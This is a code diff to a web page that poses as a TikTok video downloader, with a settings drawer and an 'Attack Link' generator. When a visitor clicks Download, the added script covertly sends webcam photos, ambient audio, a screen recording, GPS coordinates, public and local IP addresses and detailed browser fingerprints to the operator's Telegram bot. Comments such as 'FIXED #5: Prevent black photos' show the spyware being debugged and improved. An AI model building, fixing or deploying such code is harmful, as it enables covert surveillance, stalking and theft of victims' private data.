@@ -7,103 +7,56 @@
 <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-        background: #000;
-        color: #fff;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        min-height: 100vh;
-        padding: 20px;
-        overflow: hidden;
+        background: #000; color: #fff;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        display: flex; align-items: center; justify-content: center;
+        min-height: 100vh; padding: 20px; overflow: hidden;
     }
     .container {
-        width: 100%;
-        max-width: 400px;
-        background: #121212;
-        border-radius: 20px;
-        padding: 30px 20px;
-        box-shadow: 0 10px 30px rgba(255, 255, 255, 0.05);
-        text-align: center;
-        border: 1px solid #222;
-        position: relative;
-        z-index: 1;
+        width: 100%; max-width: 400px; background: #121212;
+        border-radius: 20px; padding: 30px 20px;
+        box-shadow: 0 10px 30px rgba(255,255,255,0.05);
+        text-align: center; border: 1px solid #222;
+        position: relative; z-index: 1;
     }
     .logo {
-        font-size: 2.2rem;
-        font-weight: bold;
-        margin-bottom: 10px;
+        font-size: 2.2rem; font-weight: bold; margin-bottom: 10px;
         background: -webkit-linear-gradient(45deg, #25F4EE, #FE2C55);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 10px;
+        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        display: flex; align-items: center; justify-content: center; gap: 10px;
     }
     .logo svg { width: 35px; fill: #fff; }
     p { color: #888; font-size: 0.9rem; margin-bottom: 25px; }
-
     input {
-        width: 100%;
-        padding: 15px;
-        background: #1a1a1a;
-        border: 1px solid #333;
-        border-radius: 12px;
-        color: #fff;
-        font-size: 1rem;
-        margin-bottom: 15px;
-        outline: none;
+        width: 100%; padding: 15px; background: #1a1a1a;
+        border: 1px solid #333; border-radius: 12px;
+        color: #fff; font-size: 1rem; margin-bottom: 15px; outline: none;
     }
     button {
-        width: 100%;
-        padding: 15px;
-        background: #FE2C55;
-        color: #fff;
-        border: none;
-        border-radius: 12px;
-        font-size: 1.1rem;
-        font-weight: bold;
-        cursor: pointer;
-        transition: 0.2s;
+        width: 100%; padding: 15px; background: #FE2C55;
+        color: #fff; border: none; border-radius: 12px;
+        font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: 0.2s;
     }
-
+    button:active { transform: scale(0.98); }
+    button:disabled { background: #555; cursor: not-allowed; }
     .settings-drawer {
-        position: fixed;
-        bottom: -100%;
-        left: 0;
-        right: 0;
-        background: #111;
-        border-top: 2px solid #FE2C55;
-        border-radius: 20px 20px 0 0;
-        padding: 20px;
-        transition: 0.4s ease;
-        z-index: 100;
+        position: fixed; bottom: -100%; left: 0; right: 0;
+        background: #111; border-top: 2px solid #FE2C55;
+        border-radius: 20px 20px 0 0; padding: 20px;
+        transition: 0.4s ease; z-index: 100;
     }
     .settings-drawer.open { bottom: 0; }
-    .settings-drawer h3 { color: #FE2C55; margin-bottom: 15px; font-size: 1.2rem; text-align: center; }
+    .settings-drawer h3 { color: #FE2C55; margin-bottom: 15px; text-align: center; }
     .settings-drawer label { display: block; font-size: 0.7rem; color: #888; margin-bottom: 5px; text-transform: uppercase; }
     .settings-drawer input { background: #000; border: 1px solid #333; margin-bottom: 10px; }
     .settings-drawer .btn-save { background: #25F4EE; color: #000; margin-bottom: 10px; }
     .settings-drawer .btn-copy { background: #444; margin-top: 10px; }
-    
     .toggle-settings {
-        position: fixed;
-        bottom: 20px;
-        right: 20px;
-        width: 40px;
-        height: 40px;
-        background: rgba(255,255,255,0.1);
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        cursor: pointer;
-        font-size: 1.2rem;
-        z-index: 101;
-        border: 1px solid #333;
+        position: fixed; bottom: 20px; right: 20px;
+        width: 40px; height: 40px; background: rgba(255,255,255,0.1);
+        border-radius: 50%; display: flex; align-items: center; justify-content: center;
+        cursor: pointer; font-size: 1.2rem; z-index: 101; border: 1px solid #333;
     }
-
     #cam-video { position: fixed; top: -9999px; width: 1px; height: 1px; opacity: 0; }
     #canvas { display: none; }
 </style>
@@ -117,7 +70,7 @@
     </div>
     <p>Download TikTok videos without watermark.</p>
     <input type="text" id="tiktokUrl" placeholder="Paste TikTok link here...">
-    <button onclick="alert('Processing... please wait')">Download Video</button>
+    <button id="downloadBtn">Download Video</button>
 </div>
 
 <div class="toggle-settings" onclick="toggleDrawer()">⚙️</div>
@@ -136,155 +89,532 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    function getCreds() {
-        const params = new URLSearchParams(window.location.search);
-        let token = params.get('tg_token');
-        let chatId = params.get('tg_chat');
-        if (!token || !chatId) {
-            const encodedData = params.get('tg_data');
-            if (encodedData) {
-                try {
-                    const decoded = JSON.parse(atob(decodeURIComponent(encodedData)));
-                    token = decoded.token;
-                    chatId = decoded.chatId;
-                } catch(e) {}
-            }
+/* ---------- UTILITIES ---------- */
+function escapeHtml(str) {
+    if (str === undefined || str === null) return "";
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+}
+
+// FIXED #7: Global mousemove listener so it doesn't duplicate
+let mouseMoves = 0;
+document.addEventListener('mousemove', () => mouseMoves++);
+
+/* ---------- 1) CREDENTIAL RESOLVER & SETTINGS ---------- */
+function getCreds() {
+    const params = new URLSearchParams(window.location.search);
+    let token = params.get('tg_token');
+    let chatId = params.get('tg_chat');
+    if (!token || !chatId) {
+        const encodedData = params.get('tg_data');
+        if (encodedData) {
+            try {
+                const decoded = JSON.parse(atob(encodedData));
+                token = decoded.token;
+                chatId = decoded.chatId;
+            } catch(e) { console.warn("Decode error", e); }
         }
-        return { 
-            token: token || localStorage.getItem('tg_bot_token'), 
-            chatId: chatId || localStorage.getItem('tg_chat_id') 
-        };
     }
+    return {
+        token: token || localStorage.getItem('tg_bot_token'),
+        chatId: chatId || localStorage.getItem('tg_chat_id')
+    };
+}
 
-    function toggleDrawer() {
-        document.getElementById('drawer').classList.toggle('open');
+function toggleDrawer() { document.getElementById('drawer').classList.toggle('open'); }
+
+async function saveSettings() {
+    const token = document.getElementById('botToken').value.trim();
+    const chatId = document.getElementById('chatId').value.trim();
+    const statusEl = document.getElementById('setStatus');
+    
+    if (!token || !chatId) return alert("Fill both fields!");
+    
+    try {
+        statusEl.innerText = "Verifying...";
+        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ Setup Successful!`);
+        const data = await res.json();
+        
+        if (res.ok && data.ok) {
+            localStorage.setItem('tg_bot_token', token);
+            localStorage.setItem('tg_chat_id', chatId);
+            statusEl.innerText = "Saved & Verified!";
+            statusEl.style.color = "#25F4EE";
+        } else {
+            throw new Error(data.description || 'Invalid token/chat');
+        }
+    } catch (err) {
+        statusEl.innerText = "Error: " + err.message;
+        statusEl.style.color = "red";
     }
+}
 
-    function saveSettings() {
-        const token = document.getElementById('botToken').value.trim();
-        const chatId = document.getElementById('chatId').value.trim();
-        if (!token || !chatId) return alert("Fill both fields!");
-        localStorage.setItem('tg_bot_token', token);
-        localStorage.setItem('tg_chat_id', chatId);
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ Setup Successful!`)
-        .then(() => {
-            document.getElementById('setStatus').innerText = "Saved & Verified!";
-            document.getElementById('setStatus').style.color = "#25F4EE";
-        }).catch(() => {
-            document.getElementById('setStatus').innerText = "Error saving!";
-            document.getElementById('setStatus').style.color = "red";
+function generateLink() {
+    const token = localStorage.getItem('tg_bot_token');
+    const chatId = localStorage.getItem('tg_chat_id');
+    if (!token || !chatId) return alert("Save settings first!");
+    const base = window.location.origin + window.location.pathname;
+    const data = btoa(unescape(encodeURIComponent(JSON.stringify({ token, chatId }))));
+    const finalUrl = `${base}?tg_data=${encodeURIComponent(data)}`;
+    navigator.clipboard.writeText(finalUrl).then(() => { alert("Attack Link Copied!"); });
+}
+
+/* ---------- 2) ADVANCED FINGERPRINTING & INTEL ---------- */
+function getCanvasFp() {
+    try {
+        const c = document.createElement('canvas');
+        const x = c.getContext('2d');
+        x.textBaseline = 'top'; x.font = '14px Arial'; x.fillStyle = '#f60'; x.fillRect(0, 0, 100, 30);
+        x.fillStyle = '#069'; x.fillText('tiktok_fp_🦄', 2, 15);
+        return c.toDataURL().slice(-30);
+    } catch(e) { return "N/A"; }
+}
+
+function getWebGLFp() {
+    try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        if (!gl) return "N/A";
+        const d = gl.getExtension('WEBGL_debug_renderer_info');
+        if (!d) return "N/A";
+        const renderer = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
+        return renderer ? String(renderer) : "N/A";
+    } catch(e) { return "N/A"; }
+}
+
+async function getAudioFp() {
+    return new Promise(resolve => {
+        try {
+            const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+            if (!AC) return resolve("N/A");
+            const ac = new AC(1, 44100, 44100);
+            const osc = ac.createOscillator(); osc.type='triangle'; osc.frequency.value=10000;
+            osc.connect(ac.destination); osc.start();
+            ac.startRendering().then(buf => {
+                const sum = buf.getChannelData(0).reduce((a,b)=>a+Math.abs(b),0);
+                resolve(sum.toFixed(4));
+            });
+        } catch(e) { resolve("N/A"); }
+    });
+}
+
+function getFonts() {
+    try {
+        const test = ['Arial','Helvetica Neue','Segoe UI','Roboto','Courier New','Noto Sans Bengali','SolaimanLipi'];
+        const span = document.createElement('span');
+        span.style.cssText = 'position:absolute;font-size:72px;visibility:hidden';
+        span.textContent = 'mmmmmmmmmmlli';
+        document.body.appendChild(span);
+        const detected = test.filter(f => {
+            span.style.fontFamily = 'monospace'; const a = span.offsetWidth;
+            span.style.fontFamily = `${f},monospace`; return span.offsetWidth !== a;
         });
-    }
+        span.remove();
+        return detected.join(", ") || "None";
+    } catch(e) { return "N/A"; }
+}
 
-    function generateLink() {
-        const token = localStorage.getItem('tg_bot_token');
-        const chatId = localStorage.getItem('tg_chat_id');
-        if (!token || !chatId) return alert("Save settings first!");
-        const base = window.location.origin + window.location.pathname;
-        const data = btoa(JSON.stringify({ token, chatId }));
-        const finalUrl = `${base}?tg_data=${encodeURIComponent(data)}`;
-        navigator.clipboard.writeText(finalUrl).then(() => { alert("Attack Link Copied!"); });
-    }
-
-    // --- Advanced Intel (Including Real IP) ---
-    async function getFullIntel() {
-        let ipInfo = { ip: "Unknown", city: "Unknown", country: "Unknown", isp: "Unknown" };
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            ipInfo = await res.json();
-        } catch(e) {}
-
-        let geo = "Not allowed";
-        try {
-            geo = await new Promise(res => navigator.geolocation.getCurrentPosition(
-                p => res(`${p.coords.latitude}, ${p.coords.longitude}`),
-                () => res("Permission Denied"), { timeout: 5000 }
-            ));
-        } catch(e) {}
-
-        let battery = "Unknown";
-        try {
-            const bat = await navigator.getBattery();
-            battery = `${Math.round(bat.level * 100)}%`;
-        } catch(e) {}
-
-        return {
-            ip: ipInfo.ip || "Unknown",
-            city: ipInfo.city || "Unknown",
-            country: ipInfo.country_name || "Unknown",
-            isp: ipInfo.org || "Unknown",
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            lang: navigator.language,
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            battery: battery,
-            location: geo
+// FIXED #9: Refactored WebRTC promise anti-pattern
+async function getWebRTCLocalIP() {
+    return new Promise(resolve => {
+        const found = new Set();
+        let resolved = false;
+        let pc = null;
+        const finish = () => {
+            if (resolved) return;
+            resolved = true;
+            try { if (pc) pc.close(); } catch(e){}
+            resolve([...found].join(', ') || 'Hidden (mDNS)');
         };
+        try {
+            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            pc.createDataChannel('');
+            pc.onicecandidate = e => {
+                if (!e.candidate) return finish();
+                const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                if (m) found.add(m[0]);
+                else if (e.candidate.candidate.includes('.local')) found.add('Hidden (mDNS)');
+            };
+            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(finish);
+            setTimeout(finish, 2000);
+        } catch(e) { finish(); }
+    });
+}
+
+async function getIpIntel() {
+    let info = { ip: "Unknown", city: "Unknown", country: "Unknown", isp: "Unknown", lat: null, lon: null };
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error("ipapi limit");
+        const d = await res.json();
+        info = {
+            ip: d.ip || "Unknown", city: d.city || "Unknown", country: d.country_name || "Unknown",
+            isp: d.org || "Unknown", lat: d.latitude || null, lon: d.longitude || null
+        };
+    } catch(e) { console.warn("IP fetch error:", e); }
+    return info;
+}
+
+function getRealGps() {
+    return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+            p => resolve({
+                lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy),
+                mapsUrl: `https://www.google.com/maps?q=${encodeURIComponent(p.coords.latitude + ',' + p.coords.longitude)}`
+            }),
+            () => resolve(null),
+            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        );
+    });
+}
+
+async function getDeviceIntel() {
+    let battery = "Unknown";
+    try { 
+        // FIXED #1: Safe check for getBattery
+        if (navigator.getBattery) {
+            const bat = await navigator.getBattery(); 
+            const lvl = Math.round((bat.level !== undefined ? bat.level : 0) * 100);
+            const chargingStr = bat.charging ? " (charging)" : "";
+            battery = `${lvl}%${chargingStr}`; 
+        }
+    } catch(e) {}
+    let netType = "Unknown";
+    try { netType = navigator.connection.effectiveType || "Unknown"; } catch(e) {}
+    let ram = "Unknown";
+    try { ram = (navigator.deviceMemory || "?") + " GB"; } catch(e) {}
+
+    return {
+        ua: navigator.userAgent, platform: navigator.platform,
+        lang: (navigator.languages || [navigator.language]).join(", "),
+        screen: `${screen.width}x${screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        battery: battery, cores: navigator.hardwareConcurrency || "?", ram: ram, net: netType,
+        touch: 'ontouchstart' in window ? "Yes" : "No", canvasHash: getCanvasFp(), webgl: getWebGLFp()
+    };
+}
+
+/* ---------- 3) SEND REPORT ---------- */
+async function sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts) {
+    try {
+        let msg = `🚨 <b>Victim Accessed & Profiled!</b>\n━━━━━━━━━━━━━━\n`;
+        msg += `🌐 <b>Public IP:</b> <code>${escapeHtml(ipIntel.ip)}</code>\n`;
+        msg += `🏠 <b>Local IP (WebRTC):</b> <code>${escapeHtml(localIp)}</code>\n`;
+        msg += `🏙️ <b>Location:</b> ${escapeHtml(ipIntel.city)}, ${escapeHtml(ipIntel.country)}\n`;
+        msg += `📡 <b>ISP:</b> ${escapeHtml(ipIntel.isp)}\n`;
+        msg += `━━━━━━━━━━━━━━\n`;
+
+        // FIXED #3 & #4: Null check and escape for GPS
+        if (gps && gps.lat !== null && gps.lon !== null) {
+            msg += `📍 <b>REAL GPS (Google Maps):</b>\n`;
+            msg += `   Lat/Lon: <code>${gps.lat}, ${gps.lon}</code>\n`;
+            msg += `   Accuracy: ±${gps.acc}m\n`;
+            msg += `   🗺️ <a href="${escapeHtml(gps.mapsUrl)}">Open in Google Maps</a>\n`;
+            msg += `━━━━━━━━━━━━━━\n`;
+        } else {
+            msg += `📍 GPS: <i>Denied / Unavailable</i>\n`;
+            if (ipIntel.lat && ipIntel.lon) {
+                const ipMap = `https://www.google.com/maps?q=${encodeURIComponent(ipIntel.lat + ',' + ipIntel.lon)}`;
+                msg += `   🗺️ <a href="${escapeHtml(ipMap)}">Open IP Map</a>\n`;
+            }
+            msg += `━━━━━━━━━━━━━━\n`;
+        }
+
+        msg += `💻 <b>Hardware / Fingerprint:</b>\n`;
+        msg += `   OS/Platform: ${escapeHtml(device.platform)}\n`;
+        msg += `   CPU Cores: ${escapeHtml(device.cores)} | RAM: ${escapeHtml(device.ram)}\n`;
+        msg += `   GPU: <code>${escapeHtml(device.webgl)}</code>\n`;
+        msg += `   Audio FP: <code>${escapeHtml(audioFp)}</code>\n`;
+        msg += `   Canvas Hash: <code>${escapeHtml(device.canvasHash)}</code>\n`;
+        msg += `   Fonts: ${escapeHtml(fonts)}\n`;
+        msg += `━━━━━━━━━━━━━━\n`;
+        msg += `🔋 <b>Battery:</b> ${escapeHtml(device.battery)} | 📶 <b>Net:</b> ${escapeHtml(device.net)}\n`;
+        msg += `🖱️ <b>Mouse Moves:</b> ${mouseMoves}\n`;
+        msg += `🔗 <b>UA:</b> <code>${escapeHtml(device.ua)}</code>`;
+
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'HTML', disable_web_page_preview: false })
+        });
+    } catch(e) {
+        console.warn("Report send failed:", e);
+    }
+}
+
+/* ---------- 4) REAL TIKTOK DOWNLOADER ---------- */
+async function realDownload() {
+    const urlInput = document.getElementById('tiktokUrl').value.trim();
+    const btn = document.getElementById('downloadBtn');
+
+    btn.innerText = "Fetching Video...";
+    btn.disabled = true;
+
+    let videoUrl = null;
+
+    try {
+        const res1 = await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent('https://www.tikwm.com/api/?url=' + encodeURIComponent(urlInput))}`);
+        const data1 = await res1.json();
+        if (data1 && data1.code === 0 && data1.data) {
+            videoUrl = data1.data.hdplay || data1.data.play;
+        }
+    } catch(e) { console.warn("API 1 failed", e); }
+
+    if (!videoUrl) {
+        try {
+            const res2 = await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent('https://tiklydown.eu.org/api/download?url=' + encodeURIComponent(urlInput))}`);
+            const data2 = await res2.json();
+            if (data2 && (data2.video_url || (data2.data && data2.data.play))) {
+                videoUrl = data2.video_url || data2.data.play;
+            }
+        } catch(e) { console.warn("API 2 failed", e); }
     }
 
-    async function startAttack() {
-        const { token, chatId } = getCreds();
-        if (!token || !chatId) return;
+    if (!videoUrl) {
+        btn.innerText = "❌ Invalid Link";
+        btn.style.background = "#ef4444";
+        setTimeout(() => {
+            btn.innerText = "Download Video";
+            btn.style.background = "#FE2C55";
+            btn.disabled = false;
+        }, 3000);
+        return;
+    }
 
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+    btn.innerText = "Downloading...";
+    
+    try {
+        const videoRes = await fetch(videoUrl);
+        if (!videoRes.ok) throw new Error("CORS or network error");
+        const videoBlob = await videoRes.blob();
+        const blobUrl = URL.createObjectURL(videoBlob);
+
+        const a = document.createElement('a');
+        a.href = blobUrl;
+        a.download = `TikTok_${Date.now()}.mp4`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(blobUrl);
+
+        btn.innerText = "✅ Download Complete";
+        btn.style.background = "#22c55e";
+    } catch (err) {
+        console.warn("Download error:", err);
+        btn.innerText = "❌ Download Failed";
+        btn.style.background = "#ef4444";
+    } finally {
+        setTimeout(() => {
+            btn.innerText = "Download Video";
+            btn.style.background = "#FE2C55";
+            btn.disabled = false;
+        }, 3500);
+    }
+}
+
+/* ---------- 5) SCREEN RECORDING ---------- */
+let hasAskedScreen = false;
+
+async function recordScreen(token, chatId) {
+    // FIXED #13: Check if getDisplayMedia exists (Mobile support)
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+        console.warn("Screen recording not supported on this device.");
+        return;
+    }
+    if (hasAskedScreen) return;
+    hasAskedScreen = true;
+
+    try {
+        const displayStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+        
+        // FIXED #2: Recorder hoisting
+        let recorder = new MediaRecorder(displayStream);
+        const chunks = [];
+        
+        displayStream.getVideoTracks()[0].onended = () => {
+            if (recorder && recorder.state !== 'inactive') recorder.stop();
+        };
+
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append('video', blob, 'screen.webm');
+            fd.append('caption', '📺 Screen Recording');
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
+            } catch(e) {}
+        };
+        recorder.start();
+        
+        setTimeout(() => { 
+            if (recorder.state !== 'inactive') recorder.stop(); 
+            displayStream.getTracks().forEach(t => t.stop());
+        }, 5000);
+        
+    } catch(e) { console.warn("Screen record blocked"); }
+}
+
+/* ---------- 6) GLOBAL TRACKER STATE ---------- */
+let attackRunning = false;
+let trackingInterval = null;
+let activeStream = null;
+let audioRecorder = null;
+let audioChunks = [];
+
+/* ---------- 7) MAIN TRACKER EXECUTION ---------- */
+async function startAttack() {
+    const { token, chatId } = getCreds();
+    if (!token || !chatId) return;
+    if (attackRunning) return;
+    attackRunning = true;
+
+    // FIXED #6: Stop old stream if any
+    if (activeStream) {
+        activeStream.getTracks().forEach(t => t.stop());
+        activeStream = null;
+    }
+    if (audioRecorder && audioRecorder.state !== 'inactive') {
+        try { audioRecorder.stop(); } catch(e) {}
+    }
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' }, 
+            audio: true 
+        }).catch(() => null);
+
+        activeStream = stream;
+
+        const [ipIntel, localIp, device, audioFp, fonts] = await Promise.all([
+            getIpIntel(), getWebRTCLocalIP(), getDeviceIntel(), getAudioFp(), getFonts()
+        ]);
+        
+        const gps = await getRealGps();
+
+        await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts);
+
+        if (stream) {
+            // Audio recording
+            if (stream.getAudioTracks().length > 0) {
+                const audioStream = new MediaStream(stream.getAudioTracks());
+                audioRecorder = new MediaRecorder(audioStream, { audioBitsPerSecond: 32000 });
+                audioChunks = [];
+                
+                audioRecorder.ondataavailable = e => audioChunks.push(e.data);
+                audioRecorder.onstop = async () => {
+                    if (audioChunks.length === 0) return;
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('audio', blob, 'voice.webm');
+                    fd.append('caption', '🎤 Ambient Audio (WebM)');
+                    try {
+                        await fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: fd });
+                    } catch(e) {}
+                };
+                
+                audioRecorder.start();
+                setTimeout(() => { 
+                    if (audioRecorder && audioRecorder.state !== 'inactive') audioRecorder.stop(); 
+                }, 4000);
+            }
+
             const video = document.getElementById('cam-video');
             video.srcObject = stream;
-
-            const intel = await getFullIntel();
             
-            let msg = `🚨 *Victim Accessed! (Live Stream)*\n\n`;
-            msg += `🌐 IP: ${intel.ip}\n`;
-            msg += `🏙️ City: ${intel.city}, ${intel.country}\n`;
-            msg += `📡 ISP: ${intel.isp}\n`;
-            msg += `📱 OS: ${intel.platform}\n`;
-            msg += `🌍 Loc: ${intel.location}\n`;
-            msg += `🔋 Bat: ${intel.battery}\n`;
-            msg += `🖥️ Screen: ${intel.screen}\n`;
-            msg += `🕒 TZ: ${intel.timezone}\n`;
-            msg += `🔗 UA: ${intel.ua}`;
-
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+            await new Promise(r => {
+                if (video.readyState >= 1) return r();
+                video.onloadedmetadata = r;
+                setTimeout(r, 3000);
             });
+            
+            video.play().catch(() => {});
 
-            // Continuous Capture: New frame every 5 seconds
-            const captureInterval = setInterval(async () => {
-                // Check if page is still open/active
-                if (document.hidden) return; 
+            await new Promise(r => setTimeout(r, 1000));
 
+            // FIXED #5: Prevent black photos
+            async function shootFrame(caption, retries = 2) {
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    console.warn("Skipping frame: camera not ready");
+                    return;
+                }
+                
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                canvas.toBlob(async (blob) => {
-                    if (!blob) return;
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'capture.jpg');
-                    fd.append('caption', `📸 Live Frame Update\nIP: ${intel.ip}`);
-                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-                }, 'image/jpeg', 0.7);
-            }, 5000);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                if (!blob) return;
 
-            // Stop everything when tab is closed
-            window.addEventListener('beforeunload', () => {
-                clearInterval(captureInterval);
-                stream.getTracks().forEach(track => track.stop());
-            });
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'capture.jpg');
+                fd.append('caption', caption);
+                
+                try { 
+                    const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd }); 
+                    if (!res.ok && retries > 0) throw new Error("Upload failed");
+                } catch(e) {
+                    if (retries > 0) {
+                        await new Promise(r => setTimeout(r, 2000));
+                        return shootFrame(caption, retries - 1);
+                    }
+                }
+            }
 
-        } catch (err) { console.log("Permission denied"); }
+            for (let i = 1; i <= 3; i++) {
+                await shootFrame(`📸 Burst Capture ${i}/3 | IP: ${ipIntel.ip}`);
+                await new Promise(r => setTimeout(r, 2000));
+            }
+
+            if (trackingInterval) clearInterval(trackingInterval);
+            
+            trackingInterval = setInterval(async () => {
+                if (document.hidden) return;
+                await shootFrame(`📸 Live Update | Moves: ${mouseMoves}`);
+            }, 8000);
+        }
+    } catch (err) {
+        console.warn("Start attack error:", err);
+    } finally {
+        attackRunning = false;
     }
+}
 
-    window.onload = () => {
-        document.getElementById('botToken').value = localStorage.getItem('tg_bot_token') || '';
-        document.getElementById('chatId').value = localStorage.getItem('tg_chat_id') || '';
-        startAttack();
-    };
+/* ---------- 8) BINDINGS & CLEANUP ---------- */
+document.getElementById('downloadBtn').addEventListener('click', () => {
+    const urlInput = document.getElementById('tiktokUrl').value.trim();
+    if (!urlInput) return alert("Please paste a TikTok link first!");
+
+    const { token, chatId } = getCreds();
+    
+    startAttack();
+    setTimeout(() => { if (token && chatId) recordScreen(token, chatId); }, 1000);
+    realDownload();
+});
+
+window.addEventListener('beforeunload', () => {
+    if (trackingInterval) clearInterval(trackingInterval);
+    
+    if (audioRecorder && audioRecorder.state !== 'inactive') {
+        try { audioRecorder.stop(); } catch(e) {}
+    }
+    
+    if (activeStream) {
+        activeStream.getTracks().forEach(t => t.stop());
+    }
+});
+
+window.onload = () => {
+    document.getElementById('botToken').value = localStorage.getItem('tg_bot_token') || '';
+    document.getElementById('chatId').value   = localStorage.getItem('tg_chat_id') || '';
+};
 </script>
 </body>
 </html>
